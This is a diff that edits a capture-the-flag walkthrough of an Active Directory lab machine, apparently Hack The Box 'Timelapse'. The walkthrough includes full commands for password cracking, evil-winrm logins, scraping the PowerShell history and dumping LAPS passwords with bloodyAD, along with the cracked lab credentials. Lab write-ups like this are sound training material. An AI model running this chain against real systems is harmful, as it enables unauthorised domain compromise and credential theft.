@@ -68,14 +68,11 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Sat Sep  5 10:36:28 2026 -- 1 IP address (1 host up) scanned in 235.52 seconds
 ```
 
-- ldap anonymous bind -> No
-- SMB works as **guest user** -> shares & rids
-
-- `winrm_backup` zip is password protected -> `zip2john` -> `pkzip` (tells you the encryption used on the data)
+LDAP anonymous bind fails, but SMB allows a **guest** login and exposes the domain shares and RIDs. One share holds a password-protected `winrm_backup` zip; `zip2john` identifies the encryption as `pkzip`, and it cracks quickly:
 
 > `supremelegacy`
 
-- `legacyydevauth.pfx` extracts from the zip, and the pfx is password protected too -> `pfx2john` -> crack as `pfx`
+Inside sits `legacyydevauth.pfx`, which turns out to be password protected too — `pfx2john` cracks it as a pfx:
 
 > `thuglegacy`
 
@@ -83,20 +80,19 @@ The pfx key holds the **Private_key** and **Public_key** (certificate).
 
 # User
 
-- WinRM runs on port 5986 **with SSL**
-- Usually WinRM is 5985 => no SSL configured
+WinRM is running on port 5986 **with SSL**, rather than the usual 5985 where no SSL is configured.
 
-Login through `evil-winrm` using the private & public key.
+Log in through `evil-winrm` using the private and public keys.
 
 ### Key extraction from pfx file using openssl
 
-- Private key extraction
+Extract the private key:
 
 ```sh
 openssl pkcs12 -in legacyy_dev_auth.pfx -out key.pem -nodes -nocerts
 ```
 
-- Public key extraction
+And the public key:
 
 ```sh
 openssl pkcs12 -in legacyy_dev_auth.pfx -out cert.pem -nokeys
@@ -106,21 +102,21 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -out cert.pem -nokeys
 evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S
 ```
 
-`-S` -> **evil-winrm** connects to the SSL configured port (winrms/ssl)
+The `-S` flag tells **evil-winrm** to connect over the SSL-configured WinRM port.
 
-Gained shell as `legacyy`
+Gained a shell as `legacyy`.
 
-Same as the `.bash_history` file, **powershell** keeps a **history file** too:
+Just like bash keeps a `.bash_history` file, **PowerShell** keeps a **history file** too:
 
 > Reference : https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html
 
-default path to the file:
+The default path to the file is:
 
 ```txt
 $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-if altered we can view it using `Get-PSReadlineOption`:
+The current location can also be confirmed with `Get-PSReadlineOption`:
 
 ```powershell
 cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine
@@ -128,7 +124,7 @@ cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine
 type ConsoleHost_history.txt
 ```
 
-Got the username and password of an AD user:
+The history file leaked the username and password of another AD user:
 
 > `svc_deploy - E3R$Q62^12p7PLlC%KWaxuaV`
 
@@ -144,7 +140,7 @@ For systems using **legacy LAPS**, the following AD computer object properties a
 - **ms-Mcs-AdmPwdExpirationTime**: The LAPS password expiration time
 ---
 
-Looks like bloodyAD can be used to abuse it:
+bloodyAD can query those attributes directly:
 
 ```sh
 bloodyAD --host 10.129.227.113 -d dc01.timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
@@ -156,6 +152,4 @@ bloodyAD --host 10.129.227.113 -d dc01.timelapse.htb -u 'svc_deploy' -p 'E3R$Q62
 evil-winrm -i 10.129.227.113 -u administrator -p 'jF21lrd@9ayov6S$/29hD02' -S
 ```
 
-The root flag is under the user **TRX**
-
-Gained `root`
+The root flag is under the user **TRX**. Gained `root`.
